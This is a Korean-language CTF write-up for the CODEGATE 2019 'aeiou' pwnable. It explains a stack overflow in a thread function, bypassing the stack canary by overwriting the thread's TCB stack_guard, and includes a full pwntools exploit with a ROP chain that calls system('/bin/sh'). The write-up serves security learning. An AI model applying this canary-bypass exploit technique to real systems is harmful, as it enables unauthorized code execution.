---
title: [CODEGATE 2019] - aeiou
categories:
 - pwnable
tags: codegate, pwn, tls
---

## Vulnerability

```
     Raising a Baby
-------------------------------------
      [1] Play with Cards
      [2] Clearing the Cards
      [3] Teaching numbers
      [4] Sleeping the Baby
      [5] Dancing with Baby!
      [6] Give the child blocks!
      [7] Sleep me
--------------------------------------
>>
```

```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

3번에서 pthread_join으로 실행시키는 함수에서 stack overflow가 발생한다.

6번도 분석해봐야 되는데 ida가 없어서 나중에 진행할 예정


## Exploit

보통 main thread에서 stack oveflow가 발생했다면 canary에 막혀서 binary가 종료되어야 된다.

하지만 thread에서 함수를 실행하기 전에 스택영역에 TCB(Thread Control Block)을 만들어준다.(관련 내용 포스팅 예정)

```c
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                          thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;        /* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
# ifndef __ASSUME_PRIVATE_FUTEX
  int private_futex;
# else
  int __unused1;
# endif
  int rtld_must_xmm_save;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[5];
  long int __unused2;
  /* Have space for the post-AVX register size.  */
  __m128 rtld_savespace_sse[8][4] __attribute__ ((aligned (32)));
 
  void *__padding[8];
} tcbhead_t;

```

해당 구조체의 시작 부분을 fs 레지스터가 가리키고 있고 fs:0x28로 canary 값을 가져오게 된다.

여기서 fs:0x28이 바로 stack_guard 부분이다.

결론적으로 stack overflow로 해당 구조체를 덮을 수 있게 되어서 stack_guard의 값을 [rbp-0x8]의 값과 동일하게 맞춰주면 우회가 된다.


## slv.py

```python

from pwn import *


p = process('./aeiou')
e = ELF('./aeiou')

context.terminal = ['/goorm/tmux', 'splitw', '-h']
context.log_level = 'debug'

script='''
b* 0x4013aa
b* 0x40145f
b* _IO_vfscanf_internal+47\n
dir /usr/src/glibc/eglibc-2.19/stdio-common
'''

sla = lambda c, s: p.sendlineafter(c, str(s))
sa = lambda c, s: p.sendafter(c, str(s))
sl = lambda s: p.sendline(str(s))
s = lambda s: p.send(str(s))

read_addr = e.plt['read']
system_addr = e.plt['system']
scanf_addr = e.plt['__isoc99_scanf']
binsh_offset = 0x258cdd

ppr = 0x004026f1 # pop rsi; pop r15; ret
pr = 0x004026f3 # pop rdi; ret
bss = 0x604200


def Teach_num(size, payload):
	
	sla('>>', 3)
	sa('number!\n', size)

	sleep(0.1)
	
	s(payload)
	
	return


def main():
	
	ROP = ''
	ROP += p64(pr)
	ROP += p64(0x0) # rdi = 0x0
	
	ROP += p64(ppr) 
	ROP += p64(bss) # rsi = 0x604200
	ROP += p64(0xdeadbeef) # r15 = dummy
	
	ROP += p64(read_addr) # read(0x0, 0x604200, garbage number(more than 8))
	
	ROP += p64(pr)
	ROP += p64(bss) # rdi = "/bin/sh\x0a" pointer
	
	ROP += p64(system_addr) # system("/bin/sh\x0a")
	
	payload = ''
	payload += 'a'*0x100b
	payload += 'c'*0x8 # stack_canary
	payload += 'd'*0x8 # FSP
	payload += ROP # RET
	payload += 'a'*0x6f0
	
	payload += 'e'*8 # fs:[0xffffffffffffff50]
	
	payload += 'f'*(0xf0 - len(ROP))
	payload += 'b'* (0x8 * 5)
	payload += 'c'*0x8 # stack_guard
	
	Teach_num(len(payload)-0x3, payload)
	
	p.sendline('/bin/sh')
	
	p.interactive()
	
	
if __name__ == '__main__':
	main()
	
```

ROP gadget을 엮을 때 조심해야될 부분이 fs 레지스터가 가리키고 있는 포인터 부분을 더미값으로 덮었기 때문에 fs를 참조하는 라이브러리 함수를 사용할 때 에러가 나게 된다.
(ex. scanf)

보통은 TLS변수를 사용함으로써 에러가 나기 때문에 scanf 대신 read를 사용하여 ROP gadget을 엮어주면 된다.

또한 binary에 `pop rdx` gadget은 없지만 rdx의 값이 8 이상만 되면 정상적으로 작동하기 때문에 넣어주지 않아도 동작하는 것을 볼 수 있었다.


## 공부한 내용 


- Thread에서 함수를 실행할때 스택에 TLS, TCB를 할당한다.

- TCB를 Overwrite하여 canary를 우회할 수 있다.

- canary는 TCB 구조체의 stack_guard이다.

- 32bit는 gs:0x14, 64bit는 fs:0x28을 참조하여 canary를 가져온다.



## 포스팅할 내용


1. linux stack canary (ELF Auxiliary Vectors)
- https://nekoplu5.tistory.com/206

2. TLS, TCB 관련 정리
- https://m.blog.naver.com/PostView.nhn?blogId=dmbs335&logNo=221774719137&navType=tl
- https://chao-tic.github.io/blog/2018/12/25/tls
- https://tribal1012.tistory.com/157

3. Dynamic Linker & Full RELRO

4. VDSO

5. Compile, make, linker


## Reference
```
https://nekoplu5.tistory.com/206
https://tribal1012.tistory.com/157
https://m.blog.naver.com/PostView.nhn?blogId=dmbs335&logNo=221774719137&navType=tl
https://chao-tic.github.io/blog/2018/12/25/tls
https://daehee87.tistory.com/466
```

:smile::smile::smile: